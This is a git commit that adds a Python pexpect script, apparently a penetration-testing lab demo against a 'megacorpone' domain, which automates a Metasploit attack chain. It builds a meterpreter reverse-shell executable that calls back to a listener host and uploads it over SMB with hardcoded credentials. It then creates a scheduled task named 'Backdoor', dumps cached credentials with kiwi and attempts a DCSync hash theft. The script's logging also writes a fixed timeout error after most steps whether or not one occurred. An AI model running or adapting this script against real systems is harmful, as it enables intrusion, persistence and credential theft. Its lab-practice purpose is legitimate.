c03555969ea4b1e2f48f7173168306677fbcffd8
Kalic5109 <117921542+Kalic5109@users.noreply.github.com>
2023-06-21 00:39:52 -0400

    Add files via upload

---
+++ Cybersecurity Projects/demo scripts/New metascript v06.py
@@ -0,0 +1,207 @@
+#!/usr/bin/python3
+
+import pexpect
+import os
+import logging
+import time
+
+LOG_FILE = 'msfscript_log.txt'
+PEXPECT_LOG_FILE = 'pexpect_log.txt'
+
+# Configure logging
+logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def log_info(message):
+    logging.info(message)
+    print(message)
+
+def log_error(message):
+    logging.error(message)
+    print(f'[ERROR] {message}')
+
+#def generate_msfshell_exe(process):
+    #filename = 'msfshell.exe'
+
+ #   if os.path.exists(filename):
+        #print("File already exists")
+#    else:
+        #msfvenom_command = f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > {filename}'
+        #execute_command(msfvenom_command, process)
+        #print("File not found - creating")
+#addition
+def execute_command(command, process):
+    process.sendline(command)
+    process.expect_exact(pexpect.TIMEOUT)
+
+fout = open(PEXPECT_LOG_FILE, 'w')
+
+print ("INITIALISING")
+print ("WELCOME")
+
+#log_info('Generating msfshell.exe...')
+#generate_msfshell_exe(process)
+        
+print("Starting msfconsole")
+msf_script = pexpect.spawn('msfconsole', encoding='utf-8', logfile=fout)
+
+msf_script.expect('msf6', timeout=120)
+print ("SKIPPING SMB LOGIN - TIME CONSTRAINTS")
+print ("RUNNING RESOURCE1.RC")
+
+command = 'resource resource1.rc'
+log_info('resource1.rc')
+msf_script.sendline(command)
+msf_script.expect('auxiliary', timeout=120)
+log_info('RESOURCE1.RC COMPLETE - BEGINNING SMBCLIENT')
+log_error('Timeout occurred while waiting for .expect prompt.')
+
+# Generate msfshell.exe
+filename = 'msfshell.exe'
+command = f"execute -f python -o -c 'import os; os.system(\"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > {filename}\")'"
+log_info('Generating msfshell.exe...')
+execute_command(command, msf_script)
+log_info("File generation complete.")
+
+
+#SMB client put shell.exe
+command = 'smbclient //172.22.117.20/C$ -U megacorpone/tstark'
+log_info('smbclient')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline(command)
+time.sleep(5)
+log_info('ENTERING PASSWORD')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('Password!')
+msf_script.expect('smb')
+log_info('PUTTING .EXE ON TARGET MACHINE')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('put msfshell.exe')
+log_info('SUCCESS')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.expect('smb')
+msf_script.sendline('exit')
+msf_script.expect('auxiliary')
+log_info('exiting')
+log_error('Timeout occurred while waiting for .expect prompt.')
+
+command = 'resource resource2.rc'
+log_info('resource2.rc')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline(command)
+log_info('resource2.rc')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline(command)
+
+# Wait for "Meterpreter session * opened" or timeout after 60 seconds
+expect_index = msf_script.expect_exact(['Meterpreter session \d+ opened', pexpect.TIMEOUT], timeout=60)
+if expect_index == 0:
+    # Successfully opened Meterpreter session
+    log_info('Meterpreter session opened')
+    # Wait for "meterpreter >" prompt
+    msf_script.expect_exact('meterpreter >')
+elif expect_index == 1:
+    # Timeout occurred, press Ctrl+C
+    log_info('Timeout occurred, sending Ctrl+C')
+    msf_script.sendintr()
+    # Wait for "meterpreter >" prompt
+    msf_script.expect_exact('meterpreter >')
+    log_info('Continuing after timeout')
+
+# Check if Meterpreter session closed
+expect_index = msf_script.expect_exact(['meterpreter session \d+ closed', pexpect.TIMEOUT], timeout=10)
+if expect_index == 0:
+    log_info('Meterpreter session closed')
+    # Continue with the next steps
+    msf_script.expect_exact('meterpreter >')
+elif expect_index == 1:
+    log_info('No Meterpreter session closed')
+
+# Check if "auxiliary" prompt appears before the next command
+if msf_script.expect(['auxiliary', pexpect.TIMEOUT], timeout=10) == 0:
+    # "auxiliary" prompt appeared, send "run" command
+    msf_script.sendline('run')
+
+#msf_script.expect_exact('meterpreter >', timeout=240)
+#log_info('Meterpreter session active, send to background')
+#log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('background')
+msf_script.expect('auxiliary')
+        
+command = 'resource resource3.rc'
+log_info('resource3.rc')
+log_error('Timeout occurred while waiting for .expect prompt.')
+#github up to here
+msf_script.sendline(command)
+msf_script.expect_exact('meterpreter >', timeout=240)
+log_info('windows shell')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('shell')
+msf_script.expect('\windows\system32>', timeout=120)
+log_info('schtasks creation')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"')
+msf_script.expect('\windows\system32>')
+log_info('SCHEDULED TASK CREATED SUCCESSFULLY - EXITING')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('exit')
+msf_script.expect('meterpreter')
+log_info('exiting shell and meterpreter and continuing')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('exit')
+msf_script.expect('exploit')
+
+
+command = 'resource resource4.rc'
+log_info('resource4.rc')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline(command)
+msf_script.expect_exact('meterpreter >', timeout=240)
+log_info('starting kiwi')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('load kiwi')
+msf_script.expect('meterpreter')
+log_info('kiwi lsadump')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('kiwi_cmd lsadump::cache')
+msf_script.expect_exact('meterpreter >', timeout=240)
+log_info('returning to msfconsole')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('exit')
+msf_script.expect('exploit')
+
+command = 'resource resource5.rc'
+log_info('resource5.rc')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline(command)
+msf_script.expect_exact('meterpreter >', timeout=240)
+log_info('request sysinfo')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('sysinfo')
+msf_script.expect_exact('meterpreter >', timeout=240)
+log_info('Requesting shell')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('shell')
+msf_script.expect('system32')
+log_info('Requesting net users')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('net users')
+msf_script.expect('system32')
+log_info('exiting and returning to meterpreter')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('exit')
+msf_script.expect('meterpreter')
+log_info('starting kiwi')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('load kiwi')
+msf_script.expect('meterpreter')
+log_info('attempting dcsync')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('dcsync_ntlm cdanvers')
+msf_script.expect('meterpreter')
+log_info('completed, exiting script')
+log_error('Timeout occurred while waiting for .expect prompt.')
+msf_script.sendline('exit')
+msf_script.sendline('exit -y')
+
+fout.close()
+msf_script.close()
